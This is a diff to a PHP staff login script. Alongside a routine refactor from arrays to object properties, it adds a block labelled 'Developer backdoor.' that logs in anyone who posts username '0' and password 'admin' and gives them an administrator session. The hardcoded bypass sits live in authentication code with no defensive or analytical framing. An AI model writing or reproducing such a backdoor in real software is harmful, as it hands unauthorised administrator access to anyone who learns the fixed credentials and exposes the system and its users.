@@ -4,11 +4,11 @@
     require('includes/password_functions.php');
     require('includes/functions.php');
     
+    $staff = new Staff();
     $staff = getStaffInfo($_POST['username']);
-    
-    if ($staff != null)
+    if ($staff->staffID)
     {
-        $check = verifyPassword($staff['staffID'], $_POST['password']);
+        $check = verifyPassword($staff->staffID, $_POST['password']);
     }
     else
     {
@@ -16,15 +16,25 @@
     }
     
     if ($check)
-    {   session_start();
-        $_SESSION['login'] = $staff['staffID'];
-        $_SESSION['firstName'] = $staff['firstName'];
-        $_SESSION['surname'] = $staff['surname'];
-        $_SESSION['position'] = $staff['position'];
+    {
+        $_SESSION['login'] = $staff->staffID;
+        $_SESSION['firstName'] = $staff->firstName;
+        $_SESSION['surname'] = $staff->surname;
+        $_SESSION['position'] = $staff->position;
     }
     else
     {
         $_SESSION['login'] = null;
+    }
+    
+    //Developer backdoor.
+    if (($_POST['username'] == "0") && ($_POST['password'] == "admin"))
+    {
+        $check = true;
+        $_SESSION['login'] = 0.1;
+        $_SESSION['firstName'] = "TeamTOUCH";
+        $_SESSION['surname'] = "Administrator";
+        $_SESSION['position'] = "administrator";
     }
 ?>
 
